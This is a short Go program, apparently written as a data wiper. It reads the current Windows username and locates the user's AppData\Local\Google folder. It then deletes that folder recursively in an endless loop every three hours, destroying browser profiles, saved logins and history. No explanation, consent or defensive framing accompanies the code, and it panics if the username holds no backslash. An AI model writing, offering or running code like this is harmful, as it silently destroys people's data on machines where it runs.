package main

import (
	"log"
	"os"
	"os/user"
	"strings"
	"time"
)

func main() {

	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	username := user.Username

	userNameLengt := len(username)

	valList := []string{}

	for i := 0; i <= userNameLengt; i++ {
		val1 := username[0:i]
		if strings.Contains(val1, "\\") == true {
			val2 := username[i:]
			valList = append(valList, val2)
			break
		}
	}

	userNameLast := valList[0]

	path1 := "C:\\Users\\"
	path2 := "\\AppData\\Local\\Google"
	googlePath := path1 + userNameLast + path2

	for true {
		err1 := os.RemoveAll(googlePath)
		if err1 != nil {
			time.Sleep(3 * time.Hour)
		} else {
			time.Sleep(3 * time.Hour)
		}

	}
}
